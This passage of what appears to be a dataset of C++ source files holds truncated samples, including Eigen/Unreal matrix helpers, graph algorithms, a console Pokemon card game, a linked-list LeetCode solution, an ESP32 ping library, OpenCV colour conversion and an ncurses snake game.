mat(2,0);\n    uMat.M[2][1] = mat(2,1);\n    uMat.M[2][2] = mat(2,2);\n    uMat.M[2][3] = mat(2,3);\n    uMat.M[3][0] = mat(3,0);\n    uMat.M[3][1] = mat(3,1);\n    uMat.M[3][2] = mat(3,2);\n    uMat.M[3][3] = mat(3,3);\n    return uMat.GetTransposed();\n}\n\nVector3d UHelper::unrealVectorToEigen(const FVector& vec)\n{\n    return Vector3d(vec.X, vec.Y, vec.Z);\n}\n\n\n//FString UHelper::EigenToString(const MatrixXd mat)\n//{\n//    std::ostringstream oss;\n//    oss << mat;\n//    return FString(oss.str().c_str());\n//}\n\nMatrix4d UHelper::extrinsicFromRt(const Matrix3d& R, const Vector3d& tvec)\n{\n    Matrix4d extrinsic = Matrix4d::Identity();\n    extrinsic.block<3, 3>(0, 0) = R;\n    extrinsic.block<3, 1>(0, 3) = tvec;\n    return extrinsic;\n}\n",
    "#include <iostream>\n#include \"Graph.h\"\n\nint main() {\n    // Create a directed graph\n    Graph<int> g(Graph<int>::DIRECTED);\n\n    g.addEdge(0, 1, 5);\n    g.addEdge(0, 2, 1);\n    g.addEdge(1, 2, 3);\n    g.addEdge(2, 0, 2);\n    g.addEdge(2, 3, 1);\n    g.addEdge(3, 3, 1);\n\n    // BFS\n    std::vector<int> bfsResult = g.bfs(2);\n    std::cout << \"BFS starting from node 2: \";\n    for (int node : bfsResult) {\n        std::cout << node << \" \";\n    }\n    std::cout << std::endl;\n\n    // DFS\n    std::vector<int> dfsResult = g.dfs(2);\n    std::cout << \"DFS starting from node 2: \";\n    for (int node : dfsResult) {\n        std::cout << node << \" \";\n    }\n    std::cout << std::endl;\n\n    // Dijkstra's\n    std::unordered_map<int, int> dijkstraResult = g.dijkstra(0);\n    std::cout << \"Dijkstra's shortest paths from node 0: \";\n    for (const auto& pair : dijkstraResult) {\n        std::cout << \"Node \" << pair.first << \" - Distance \" << pair.second << \", \";\n    }\n    std::cout << std::endl;\n\n    // General shortest path algorithm\n    std::unordered_map<int, int> spResult = g.shortestPath(0);\n    std::cout << \"General shortest paths from node 0: \";\n    for (const auto& pair : spResult) {\n        std::cout << \"Node \" << pair.first << \" - Distance \" << pair.second << \", \";\n    }\n    std::cout << std::endl;\n\n    // Floyd-Warshall\n    int V = 4; // Number of vertices\n    std::vector<std::vector<int>> dist(V, std::vector<int>(V, INF));\n    g.floydWarshall(dist);\n    std::cout << \"Floyd-Warshall all pairs shortest paths: \\n\";\n    for (int i = 0; i < V; ++i) {\n        for (int j = 0; j < V; ++j) {\n            if (dist[i][j] == INF) {\n                std::cout << \"INF \";\n            } else {\n                std::cout << dist[i][j] << \" \";\n            }\n        }\n        std::cout << std::endl;\n    }\n\n    // Cycle Detection\n    std::cout << \"Graph has cycle: \" << (g.hasCycle() ? \"Yes\" : \"No\") << std::endl;\n\n    return 0;\n}\n",
    "#include <iostream>\r\n#include <vector>\r\n#include <algorithm>\r\n#include <random>\r\n#include <ctime>\r\n#include <iomanip>\r\n\r\nclass Pokemon {\r\nprivate:\r\n    std::string name;\r\n    int damage;\r\npublic:\r\n    Pokemon() : name(\"\"), damage(0) {}\r\n    Pokemon(std::string n, int d) : name(n), damage(d) {}\r\n\r\n    std::string getName() const { return name; }\r\n    int getDamage() const { return damage; }\r\n    void setName(const std::string& n) { name = n; }\r\n    void setDamage(int d) { damage = d; }\r\n\r\n    void show() const {\r\n        std::cout << name << \" (Damage: \" << damage << \")\";\r\n    }\r\n\r\n    void showCard() const {\r\n        std::cout << \" +---------------------+\" << std::endl;\r\n        std::cout << \" | \" << std::setw(19) << std::left << name << \" |\" << std::endl;\r\n        std::cout << \" |                     |\" << std::endl;\r\n        std::cout << \" |   Damage Points: \" << std::setw(3) << damage << \"    |\" << std::endl;\r\n        std::cout << \" +---------------------+\" << std::endl;\r\n    }\r\n};\r\n\r\nclass Deck {\r\nprivate:\r\n    std::vector<Pokemon> cards;\r\npublic:\r\n    Deck() {\r\n        cards = {\r\n            Pokemon(\"Pikachu\", 100), Pokemon(\"Charizard\", 60),\r\n            Pokemon(\"Bulbasaur\", 50), Pokemon(\"Squirtle\", 50),\r\n            Pokemon(\"Tauros\", 80), Pokemon(\"Magmar\", 70),\r\n            Pokemon(\"Eevee\", 60), Pokemon(\"Snorlax\", 65),\r\n            Pokemon(\"Dragonite\", 75), Pokemon(\"Arcanine\", 90)\r\n        };\r\n        std::shuffle(cards.begin(), cards.end(), std::default_random_engine(static_cast<unsigned>(time(0))));\r\n    }\r\n\r\n    Pokemon drawCard() {\r\n        if (cards.empty()) return Pokemon();\r\n        Pokemon card = cards.back();\r\n        cards.pop_back();\r\n        return card;\r\n    }\r\n\r\n    int remainingCards() const {\r\n        return cards.size();\r\n    }\r\n\r\n    const std::vector<Pokemon>& getCards() const {\r\n        return cards;\r\n    }\r\n};\r\n\r\nclass Player {\r\nprotected:\r\n    std::string name;\r\n    std::vector<Pokemon> hand;\r\n    int score;\r\npublic:\r\n    Player() : name(\"\"), score(0) {}\r\n    Player(std::string n) : name(n), score(0) {}\r\n\r\n    std::string getName() const { return name; }\r\n    int getScore() const { return score; }\r\n    void setName(const std::string& n) { name = n; }\r\n    void setScore(int s) { score = s; }\r\n\r\n    void drawCard(Deck& deck) {\r\n        hand.push_back(deck.drawCard());\r\n    }\r\n\r\n    virtual Pokemon playCard() = 0;\r\n\r\n    void showHand() const {\r\n        std::cout << name << \"'s hand: \";\r\n        for (const auto& card : hand) {\r\n            card.show();\r\n            std::cout << \" \";\r\n        }\r\n        std::cout << std::endl;\r\n    }\r\n\r\n    std::vector<Pokemon>& getHand() { return hand; }\r\n};\r\n\r\nclass HumanPlayer : public Player {\r\npublic:\r\n    HumanPlayer(std::string n) : Player(n) {}\r\n\r\n    Pokemon playCard() override {\r\n        int choice;\r\n        while (true) {\r\n            std::cout << \"Choose a card to play (1-\" << hand.size() << \"): \";\r\n            std::cin >> choice;\r\n            if (choice == 5) {\r\n                std::cout << \"Computer's hand: \";\r\n                for (const auto& card : getHand()) {\r\n                    card.show();\r\n                    std::cout << \" \";\r\n                }\r\n                std::cout << std::endl;\r\n            }\r\n            else if (choice > 0 && choice <= hand.size()) {\r\n                Pokemon card = hand[choice - 1];\r\n                hand.erase(hand.begin() + (choice - 1));\r\n                return card;\r\n            }\r\n            else {\r\n                std::cout << \"Invalid choice, please try again.\" << std::endl;\r\n            }\r\n        }\r\n    }\r\n};\r\n\r\nclass ComputerPlayer : public Player {\r\npublic:\r\n    ComputerPlayer(std::string n) : Player(n) {}\r\n\r\n    Pokemon playCard() override {\r\n        int choice = rand() % hand.size();\r\n        Pokemon card = hand[choice];\r\n        hand.erase(hand.begin() + choice);\r\n        return card;\r\n    }\r\n};\r\n\r\nclass Game {\r\nprivate:\r\n    Deck deck;\r\n    Player* player1;\r\n    Player* player2;\r\n    std::vector<Pokemon> playedCards;\r\n    bool isHumanVsComputer;\r\n\r\n    void showBoard(const Pokemon& p1_card, const Pokemon& p2_card, bool revealCards) const {\r\n        std::cout << \"============================================\" << std::endl;\r\n        std::cout << player2->getName() << \"'s Cards: \" << std::endl;\r\n        for (size_t i = 0; i < player2->getHand().size(); ++i) {\r\n            std::cout << \"[#] \";\r\n        }\r\n        std::cout << std::endl;\r\n        std::cout << \"============================================\" << std::endl;\r\n        std::cout << \"Played Cards: \";\r\n        for (const auto& card : playedCards) {\r\n            card.show();\r\n            std::cout << \" \";\r\n        }\r\n        std::cout << std::endl;\r\n        std::cout << \"============================================\" << std::endl;\r\n        std::cout << player1->getName() << \"'s Cards: \";\r\n        for (const auto& card : player1->getHand()) {\r\n            card.show();\r\n            std::cout << \" \";\r\n        }\r\n        std::cout << std::end",
    "/**\n * Definition for singly-linked list.\n * struct ListNode {\n *     int val;\n *     ListNode *next;\n *     ListNode() : val(0), next(nullptr) {}\n *     ListNode(int x) : val(x), next(nullptr) {}\n *     ListNode(int x, ListNode *next) : val(x), next(next) {}\n * };\n */\n\nconst auto init = [](){\n       std::cin.tie(nullptr);\n       std::cout.tie(nullptr);\n       std::ios_base::sync_with_stdio(false);\n       return nullptr;\n}();\n //T.C : O(2N)\n //S.C : O(1)\nclass Solution {\npublic:\n    ListNode* reverseLL(ListNode* head) {\n        ListNode* temp = head;\n        ListNode* prev = NULL;\n        while (temp != NULL) {\n            ListNode* front = temp->next;\n            temp->next = prev;\n            prev = temp;\n            temp = front;\n        }\n        return prev;\n    }\n\n    ListNode* getKthNode(ListNode* temp, int k) {\n        k -= 1;\n        while (temp != NULL && k > 0) {\n            k--;\n            temp = temp->next;\n        }\n        return temp;\n    }\n\n    ListNode* reverseKGroup(ListNode* head, int k) {\n        ListNode* temp = head;\n        ListNode* prevLast = NULL;\n        while (temp != NULL) {\n            ListNode* kThNode = getKthNode(temp, k);\n            if (kThNode == NULL) {\n                if (prevLast) {\n                    prevLast->next = temp;\n                }\n                break;\n            }\n            ListNode* nextNode = kThNode->next;\n            kThNode->next = NULL;\n            reverseLL(temp);\n            if (temp == head) {\n                head = kThNode;\n            } else {\n                prevLast->next = kThNode;\n            }\n            prevLast = temp;\n            temp = nextNode;\n        }\n        return head;\n    }\n};",
    "/*\n* ESP32 Ping library\n*\n* All rights reserved.\n*\n* Permission to use, copy, modify, and distribute this software\n* and its documentation for any purpose and without fee is hereby\n* granted, provided that the above copyright notice appear in all\n* copies and that both that the copyright notice and this\n* permission notice and warranty disclaimer appear in supporting\n* documentation, and that the name of the author not be used in\n* advertising or publicity pertaining to distribution of the\n* software without specific, written prior permission.\n*\n* The author disclaim all warranties with regard to this\n* software, including all implied warranties of merchantability\n* and fitness.  In no event shall the author be liable for any\n* special, indirect or consequential damages or any damages\n* whatsoever resulting from loss of use, data or profits, whether\n* in an action of contract, negligence or other tortious action,\n* arising out of or in connection with the use or performance of\n* this software.\n*\n* --------------------------------------------------------------------------------\n*  Ping Library is based on the following source code:\n*\n* Lua RTOS, ping utility\n*\n*\n* Author: Jaume Oliv\ufffd (jolive@iberoxarxa.com / jolive@whitecatboard.org)\n*\n* --------------------------------------------------------------------------------\n*\n* Redistribution and use in source and binary forms, with or without modification,\n* are permitted provided that the following conditions are met:\n*\n* 1. Redistributions of source code must retain the above copyright notice,\n*    this list of conditions and the following disclaimer.\n* 2. Redistributions in binary form must reproduce the above copyright notice,\n*    this list of conditions and the following disclaimer in the documentation\n*    and/or other materials provided with the distribution.\n* 3. The name of the author may not be used to endorse or promote products\n*    derived from this software without specific prior written permission.\n*\n* THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESS OR IMPLIED\n* WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF\n* MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT\n* SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,\n* EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT\n* OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS\n* INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN\n* CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING\n* IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY\n* OF SUCH DAMAGE.\n*\n* This file is part of the lwIP TCP/IP stack.\n*\n*/\n#ifdef ESP32\n#include <Arduino.h>\n\n#include <math.h>\n#include <float.h>\n#include <signal.h>\n#include <stdint.h>\n#include <string.h>\n#include <errno.h>\n\n#include \"ping32.h\"\n\n#include \"lwip/inet_chksum.h\"\n#include \"lwip/ip.h\"\n#include \"lwip/ip4.h\"\n#include \"lwip/err.h\"\n#include \"lwip/icmp.h\"\n#include \"lwip/sockets.h\"\n#include \"lwip/sys.h\"\n#include \"lwip/netdb.h\"\n#include \"lwip/dns.h\"\n\nstatic uint16_t ping_seq_num;\nstatic uint8_t stopped = 0;\n\n/*\n* Statistics\n*/\nstatic uint32_t transmitted = 0;\nstatic uint32_t received = 0;\nstatic float min_time = 0;\nstatic float max_time = 0;\nstatic float mean_time = 0;\nstatic float last_mean_time = 0;\nstatic float var_time = 0;\n\n#define PING_ID 0xAFAF\n\n#ifndef PING_DEFAULT_COUNT\n#define PING_DEFAULT_COUNT    10\n#endif\n#ifndef PING_DEFAULT_INTERVAL\n#define PING_DEFAULT_INTERVAL  1\n#endif\n#ifndef PING_DEFAULT_SIZE\n#define PING_DEFAULT_SIZE     32\n#endif\n#ifndef PING_DEFAULT_TIMEOUT\n#define PING_DEFAULT_TIMEOUT   1\n#endif\n\n/*\n* Helper functions\n*\n*/\nstatic void ping_prepare_echo(struct icmp_echo_hdr *iecho, uint16_t len) {\n    size_t i;\n    size_t data_len = len - sizeof(struct icmp_echo_hdr);\n\n    ICMPH_TYPE_SET(iecho, ICMP_ECHO);\n    ICMPH_CODE_SET(iecho, 0);\n    iecho->chksum = 0;\n    iecho->id = PING_ID;\n    iecho->seqno = htons(++ping_seq_num);\n\n    /* fill the additional data buffer with some data */\n    for (i = 0; i < data_len; i++) {\n        ((char*)iecho)[sizeof(struct icmp_echo_hdr) + i] = (char)i;\n    }\n\n    iecho->chksum = inet_chksum(iecho, len);\n}\n\nstatic err_t ping_send(int s, ip4_addr_t *addr, int size) {\n    struct icmp_echo_hdr *iecho;\n    struct sockaddr_in to;\n    size_t ping_size = sizeof(struct icmp_echo_hdr) + size;\n    int err;\n\n    iecho = (struct icmp_echo_hdr *)mem_malloc((mem_size_t)ping_size);\n    if (!iecho) {\n\tmem_free(iecho);    \n        return ERR_MEM;\n    }\n\n    ping_prepare_echo(iecho, (uint16_t)ping_size);\n\n    to.sin_len = sizeof(to);\n    to.sin_family = AF_INET;\n    inet_addr_from_ip4addr(&to.sin_addr, addr);\n\n    if ((err = sendto(s, iecho, ping_size, 0, (struct sockaddr*)&to, sizeof(to)))) {\n        transmitted++;\n    }\n    mem_free(iecho);\n    return (err ? ERR_OK : ERR_VAL);\n}\n\nstatic void ping_recv(int s) {\n    char b",
    "#include \"myfunctions.h\"\r\n\r\ncv::Mat ConvertRGBtoYCbCr(const cv::Mat& src, const std::vector<std::vector<float>>& transformationMatrix) {\r\n// Create a new Mat with the same dimensions as the source but with CV_8UC3 type\r\ncv::Mat dst(src.rows, src.cols, CV_8UC3);\r\n\r\nfor (int y = 0; y < src.rows; ++y) {\r\nfor (int x = 0; x < src.cols; ++x) {\r\n// Extract individual R, G, B values\r\ncv::Vec3b rgb = src.at<cv::Vec3b>(y, x);\r\nfloat B = rgb[2];\r\nfloat G = rgb[1];\r\nfloat R = rgb[0];\r\n\r\n// Apply the transformation matrix to convert RGB to YCbCr\r\nuchar Y = static_cast<uchar>(transformationMatrix[0][0] * R + transformationMatrix[0][1] * G + transformationMatrix[0][2] * B);\r\nuchar Cb = static_cast<uchar>(128 + transformationMatrix[1][0] * R + transformationMatrix[1][1] * G + transformationMatrix[1][2] * B);\r\nuchar Cr = static_cast<uchar>(128 + transformationMatrix[2][0] * R + transformationMatrix[2][1] * G + transformationMatrix[2][2] * B);\r\n\r\n// Assign the YCbCr values to the destination image\r\ndst.at<cv::Vec3b>(y, x) = cv::Vec3b(Y, Cb, Cr);\r\n}\r\n}\r\nreturn dst;\r\n}\r\n\r\n// RGBtoYCbCr420\r\ncv::Mat RGBtoYCbCr420(const cv::Mat& src, const std::vector<std::vector<float>>& transformationMatrix) {\r\n// Create a new Mat with the same dimensions as the source but with CV_8UC3 type\r\ncv::Mat dst(src.rows, src.cols, CV_8UC3, cv::Scalar(0));\r\n\r\nfor (int y = 0; y < src.rows; ++y) \r\n{\r\n    for (int x = 0; x < src.cols; ++x) \r\n    {\r\n    // Extract individual R, G, B values\r\n    cv::Vec3b rgb = src.at<cv::Vec3b>(y, x);\r\n    float B = rgb[2];\r\n    float G = rgb[1];\r\n    float R = rgb[0];\r\n\r\n    // Apply the transformation matrix to convert RGB to YCbCr\r\n    uchar Y = static_cast<uchar>(transformationMatrix[0][0] * R + transformationMatrix[0][1] * G + transformationMatrix[0][2] * B);\r\n    uchar Cb;\r\n    uchar Cr;\r\n    if( (y & 1) && ( x & 1))\r\n    {\r\n        Cb = static_cast<uchar>(128 + transformationMatrix[1][0] * R + transformationMatrix[1][1] * G + transformationMatrix[1][2] * B);\r\n        Cr = static_cast<uchar>(128 + transformationMatrix[2][0] * R + transformationMatrix[2][1] * G + transformationMatrix[2][2] * B);\r\n    }\r\n\r\n    // Assign the YCbCr values to the destination image\r\n    dst.at<cv::Vec3b>(y, x) = cv::Vec3b(Y, Cb, Cr);\r\n    }\r\n}\r\nreturn dst;\r\n}\r\n// interpolation\r\ncv::Mat interpolation(const cv::Mat& src) \r\n{\r\n    // Create a new Mat with the same dimensions as the source but with CV_8UC3 type\r\n    cv::Mat dst(src.rows, src.cols, CV_8UC3, cv::Scalar(0));\r\n\r\n    for (int y = 0; y < src.rows; ++y) \r\n    {\r\n        for (int x = 0; x < src.cols; ++x) \r\n        {\r\n            // Extract individual R, G, B values\r\n            cv::Vec3b rgb = src.at<cv::Vec3b>(y, x);\r\n            float Cr_old = rgb[2];\r\n            float Cb_old = rgb[1];\r\n            float Y_old = rgb[0];\r\n\r\n            uchar Cb;\r\n            uchar Cr;\r\n            if( (y & 1) && ( x & 1 ))\r\n            {\r\n                Cb = Cb_old;\r\n                Cr = Cr_old;\r\n            }else if (y & 1 == 0)\r\n                {\r\n                    cv::Vec3b yCbCr;\r\n                    if(x & 1)\r\n                    {\r\n                        yCbCr = src.at<cv::Vec3b>(y+1, x);\r\n                    }else\r\n                    {\r\n                        yCbCr = src.at<cv::Vec3b>(y+1, x+1);\r\n                    }\r\n                    Cb = yCbCr[1];\r\n                    Cr = yCbCr[2];\r\n                }\r\n                else\r\n                {\r\n                    cv::Vec3b yCbCr = src.at<cv::Vec3b>(y, x+1);\r\n                    Cb = yCbCr[1];\r\n                    Cr = yCbCr[2];\r\n                }\r\n\r\n            // Assign the YCbCr values to the destination image\r\n            dst.at<cv::Vec3b>(y, x) = cv::Vec3b(Y_old, Cb, Cr);\r\n        }\r\n    }\r\n    return dst;\r\n}\r\n\r\ncv::Mat ConvertYCbCrToRGB(const cv::Mat& ycbcr_image, const std::vector<std::vector<float>>& inverseMatrix) {\r\n// Check if the inverse matrix is 3x3\r\nif (inverseMatrix.size() != 3 || inverseMatrix[0].size() != 3 ||\r\ninverseMatrix[1].size() != 3 || inverseMatrix[2].size() != 3) {\r\nthrow std::runtime_error(\"Inverse matrix must be 3x3\");\r\n}\r\n\r\n// Create an empty RGB image with the same dimensions as the YCbCr image\r\ncv::Mat rgb_image(ycbcr_image.rows, ycbcr_image.cols, CV_8UC3);\r\n\r\nfor (int y = 0; y < ycbcr_image.rows; ++y) {\r\nfor (int x = 0; x < ycbcr_image.cols; ++x) {\r\n// Get the YCbCr pixel\r\ncv::Vec3b ycbcr_pixel = ycbcr_image.at<cv::Vec3b>(y, x);\r\n\r\n//ycbcr_pixel[1] -= 128;\r\n//ycbcr_pixel[2] -= 128;\r\n\r\ndouble Cb = ycbcr_pixel[1] - 128;\r\ndouble Cr = ycbcr_pixel[2] - 128;\r\n// Apply the inverse matrix to get the RGB values\r\nfloat R = inverseMatrix[0][0] * ycbcr_pixel[0] + inverseMatrix[0][1] * Cb + inverseMatrix[0][2] * Cr;\r\nfloat G = inverseMatrix[1][0] * ycbcr_pixel[0] + inverseMatrix[1][1] * Cb + inverseMatrix[1][2] * Cr;\r\nfloat B = inverseMatrix[2][0] * ycbcr_pixel[0] + inverseMatrix[2][1] * Cb + inverseMatrix[2][2] * Cr;\r\n\r\n// Clip the values to be in the 0 to 255 range\r\nuchar r = static_cast<uchar>(std::max(0.0f, s",
    "#include \"Graph.h\"\r\n\r\n#include <tuple>\r\n#include <vector>\r\n#include <list>\r\n#include <queue>\r\n#include <stack>\r\n#include <iostream>\r\n\r\n#ifndef INF\r\n#define INF 0x3F3F3F3F\r\n#endif\r\n\r\nGraph::Graph(std::vector<int> v, std::vector<std::tuple<int, int, int> > e, bool bi) : bidirectional(bi)\r\n{\r\n    //copia os v\u00e9rtices e os organiza\r\n    vertices = v;\r\n    std::sort(vertices.begin(), vertices.end());\r\n\r\n    //copia as arestas\r\n    edges = e;\r\n    std::sort(edges.begin(), edges.end());\r\n}\r\n\r\nvoid Graph::printMatrix()\r\n{\r\n    //cria a matriz\r\n    int **matrix = new int*[vertices.size()];\r\n    for(int i = 0; i < vertices.size(); i++){\r\n        matrix[i] = new int[vertices.size()];\r\n    }\r\n\r\n    //incializa com 0\r\n    for(int i = 0; i < vertices.size(); i++){\r\n        for(int j = 0; j < vertices.size(); j++){\r\n            matrix[i][j] = 0;\r\n        }\r\n    }\r\n\r\n    //d\u00e1 valores \u00e0 matriz\r\n    for(int i = 0; i < vertices.size(); i++){\r\n        for(int j = 0; j < vertices.size(); j++){\r\n            for(int k = 0; k < edges.size(); k++){\r\n                if(i+1 == std::get<0>(edges[k]) && j+1 == std::get<1>(edges[k])){\r\n                    matrix[i][j] = std::get<2>(edges[k]);\r\n                    \r\n                    if(bidirectional){\r\n                        matrix[j][i] = std::get<2>(edges[k]);\r\n                    }\r\n                    \r\n                    break;\r\n                }\r\n            }\r\n        }\r\n    }\r\n\r\n    //imprime a matriz\r\n    std::cout << \"Matriz de adjac\u00eancias:\\n \";\r\n    for(int i = 0; i < vertices.size(); i++){\r\n        std::cout << \" \" << vertices[i];\r\n    }\r\n    for(int i = 0; i < vertices.size(); i++){\r\n        std::cout << std::endl << vertices[i];\r\n        for(int j = 0; j < vertices.size(); j++){\r\n            std::cout << \" \" << matrix[i][j];\r\n        }\r\n    }\r\n\r\n    //deleta a matriz\r\n    for (int i = 0; i < vertices.size(); i++){\r\n        delete [] matrix[i];\r\n    }\r\n    delete [] matrix;\r\n}\r\n\r\nvoid Graph::printList()\r\n{\r\n    //inicia o vetor\r\n    std::list<std::pair<int, int> > *adj = new std::list<std::pair<int, int> >[vertices.size()+1];\r\n\r\n    //preenche a lista\r\n    for(int i = 0; i < edges.size(); i++){\r\n        adj[std::get<0>(edges[i])].push_back( {std::get<1>(edges[i]), std::get<2>(edges[i])} );\r\n        if(bidirectional){\r\n            adj[std::get<1>(edges[i])].push_back( {std::get<0>(edges[i]), std::get<2>(edges[i])} );\r\n        }\r\n    }\r\n\r\n    //imprime a lista\r\n    std::cout << \"Lista de adjac\u00eancias:\";\r\n    for(int i = 1; i <= vertices.size(); i++){\r\n        std::cout << std::endl << i << \": \";\r\n        for(std::list<std::pair<int, int> >::iterator it = adj[i].begin(); it != adj[i].end(); it++){\r\n            std::cout << \"(\" << it->first << \", \" << it->second << \")\";\r\n        }\r\n    }\r\n\r\n    //deleta o vetor\r\n    delete [] adj;\r\n}\r\n\r\nvoid depth(int vertex, int v, std::list<std::pair<int, int> > *adj, std::list<std::pair<int, int> > &e, int *num, int i)\r\n{\r\n    //anota a profundidade, iniciando em 1\r\n    num[v] = i++;\r\n\r\n    //para se for o primeiro\r\n    if(v == vertex){\r\n        return;\r\n    }\r\n\r\n    //percorre os vertices\r\n    for(auto u : adj[v]){\r\n        int next = u.first;\r\n        if(num[next] == 0){\r\n            e.push_back({ v, next });\r\n            depth(vertex, next, adj, e, num, i);\r\n            //para a busca se achar\r\n            if(num[vertex] != 0){\r\n                return;\r\n            }\r\n        }\r\n    }\r\n}\r\n\r\nvoid Graph::dfs(int vertex)\r\n{\r\n    //previne que o vertice procurado esteja fora do vetor\r\n    if(vertex < 0 || vertex > vertices.size()){\r\n        std::cout << \"V\u00e9rtice de n\u00famero fora do tamanho do vetor de v\u00e9rtices\";\r\n        return;\r\n    }\r\n\r\n    //inicia o vetor\r\n    std::list<std::pair<int, int> > *adj = new std::list<std::pair<int, int> >[vertices.size()+1];\r\n\r\n    //preenche a lista\r\n    for(int i = 0; i < edges.size(); i++){\r\n        adj[std::get<0>(edges[i])].push_back( {std::get<1>(edges[i]), std::get<2>(edges[i])} );\r\n        if(bidirectional){\r\n            adj[std::get<1>(edges[i])].push_back( {std::get<0>(edges[i]), std::get<2>(edges[i])} );\r\n        }\r\n    }\r\n\r\n    //incia a lista do caminho encontrado\r\n    std::list<std::pair<int, int> > path;\r\n    int *num = new int[vertices.size()+1];\r\n\r\n    for(int i = 0; i <= vertices.size(); i++){\r\n        num[i] = 0;\r\n    }\r\n\r\n    //faz a busca\r\n    for(auto v : vertices){\r\n        if(num[v] == 0){\r\n            path.clear();\r\n            int i = 1;\r\n            depth(vertex, v, adj, path, num, i);\r\n            if(num[vertex] != 0) break;\r\n        }\r\n    }\r\n\r\n    //impress\u00e3o do caminho\r\n    if(num[vertex] != 1){\r\n        std::cout << \"Econtrado com caminho percorrido:\\n\";\r\n        for(std::list<std::pair<int, int> >::iterator it = path.begin(); it != path.end(); it++){\r\n            std::cout << it->first << \"->\" << it->second << \" \";\r\n        }\r\n    }\r\n    else{\r\n        std::cout << \"Econtrado na primeira posi\u00e7\u00e3o\";\r\n    }\r\n\r\n    delete [] num;\r\n\r\n    //deleta o vetor\r\n    delete [] adj;\r\n}\r\n\r\nvo",
    "#include \"game.h\"\n#include <iostream>\n#include <fstream>\n#include <queue>\n#include <cstdlib>\n#include <ctime>\n#include <unistd.h>\n#include <filesystem>\n#include <algorithm>\n#include <ncurses.h>\n\nnamespace fs = std::filesystem;\n\n/**\n * @brief Calcula a pr\u00f3xima posi\u00e7\u00e3o da cobra com base na dire\u00e7\u00e3o fornecida.\n *\n * Esta fun\u00e7\u00e3o recebe a posi\u00e7\u00e3o atual da cobra e uma dire\u00e7\u00e3o, e retorna a nova \n * posi\u00e7\u00e3o da cobra ap\u00f3s mover-se uma unidade na dire\u00e7\u00e3o especificada.\n *\n * @param current A posi\u00e7\u00e3o atual da cobra.\n * @param direction A dire\u00e7\u00e3o em que a cobra deve se mover.\n * @return A nova posi\u00e7\u00e3o da cobra ap\u00f3s mover-se na dire\u00e7\u00e3o especificada.\n */\nPosition getNextPosition(Position current, Direction direction) {\n    switch (direction) {\n        case UP: current.y--; break;\n        case DOWN: current.y++; break;\n        case LEFT: current.x--; break;\n        case RIGHT: current.x++; break;\n    }\n    return current;\n}\n\n/**\n * @brief Obt\u00e9m as dire\u00e7\u00f5es v\u00e1lidas para a pr\u00f3xima movimenta\u00e7\u00e3o da cobra.\n *\n * Esta fun\u00e7\u00e3o avalia todas as dire\u00e7\u00f5es poss\u00edveis (cima, baixo, esquerda, direita)\n * a partir da posi\u00e7\u00e3o atual da cobra e retorna as dire\u00e7\u00f5es que n\u00e3o resultam em colis\u00e3o\n * com paredes ou com o pr\u00f3prio corpo da cobra.\n *\n * @param current A posi\u00e7\u00e3o atual da cobra.\n * @param state O estado atual do jogo, contendo informa\u00e7\u00f5es sobre a grade, a posi\u00e7\u00e3o da cobra e outros detalhes.\n * @return Um vetor contendo as dire\u00e7\u00f5es v\u00e1lidas para a pr\u00f3xima movimenta\u00e7\u00e3o da cobra.\n */\nstd::vector<Direction> getValidDirections(Position current, const GameState& state) {\n    std::vector<Direction> directions;\n    std::vector<Direction> allDirections = {UP, DOWN, LEFT, RIGHT};\n    for (auto dir : allDirections) {\n        Position next = getNextPosition(current, dir);\n        if (next.x >= 0 && next.x < state.width && next.y >= 0 && next.y < state.height && state.grid[next.y][next.x] != '#') {\n            bool isSnake = false;\n            for (const auto& pos : state.snake) {\n                if (pos.x == next.x && pos.y == next.y) {\n                    isSnake = true;\n                    break;\n                }\n            }\n            if (!isSnake) {\n                directions.push_back(dir);\n            }\n        }\n    }\n    return directions;\n}\n\n/**\n * @brief Inicializa o estado do jogo a partir de um arquivo de n\u00edvel.\n *\n * Esta fun\u00e7\u00e3o carrega o estado do jogo a partir de um arquivo de n\u00edvel especificado,\n * inicializando a cobra, a grade do jogo e a posi\u00e7\u00e3o da comida. Se o arquivo cont\u00e9m\n * caracteres inv\u00e1lidos, o n\u00edvel ser\u00e1 ignorado.\n *\n * @param filename O nome do arquivo de n\u00edvel a ser carregado.\n * @return O estado inicializado do jogo.\n */\nGameState initializeGame(const std::string& filename) {\n    GameState state;\n    std::ifstream file(filename);\n    if (!file.is_open()) {\n        std::cerr << \"Error opening file!\" << std::endl;\n        exit(1);\n    }\n\n    file >> state.height >> state.width;\n    state.grid.resize(state.height);\n\n    std::string line;\n    std::getline(file, line); \n\n    for (int i = 0; i < state.height; ++i) {\n    std::getline(file, state.grid[i]);\n    for (int j = 0; j < state.width; ++j) {\n        char cell = state.grid[i][j];\n        if (cell == '&') {\n            state.spawn = {j, i};\n            state.snake = {state.spawn};\n            state.grid[i][j] = ' ';\n        } else if (cell == '$' || std::isdigit(cell)) {\n            std::cerr << \"Warning: Level \" << filename << \" contains invalid character '\" << cell << \"' and will be skipped.\" << std::endl;\n            state.gameOver = true;\n            return state;\n        }\n    }\n}\n    do {\n        state.food.x = rand() % state.width;\n        state.food.y = rand() % state.height;\n    } while (state.grid[state.food.y][state.food.x] != ' ');\n\n    state.direction = RIGHT;\n    state.gameOver = false;\n    state.lives = 5; \n    state.foodCounter = 0; \n    return state;\n}\n\n/**\n * @brief Renderiza o estado atual do jogo no terminal.\n *\n * Esta fun\u00e7\u00e3o limpa a tela e imprime o estado atual do jogo, incluindo vidas restantes, pontua\u00e7\u00e3o,\n * quantidade de comida consumida e a posi\u00e7\u00e3o atual da comida. A fun\u00e7\u00e3o percorre o tabuleiro de jogo\n * e imprime caracteres para representar a comida, as partes da cobra e as paredes. Ap\u00f3s a renderiza\u00e7\u00e3o,\n * a tela \u00e9 atualizada para refletir as 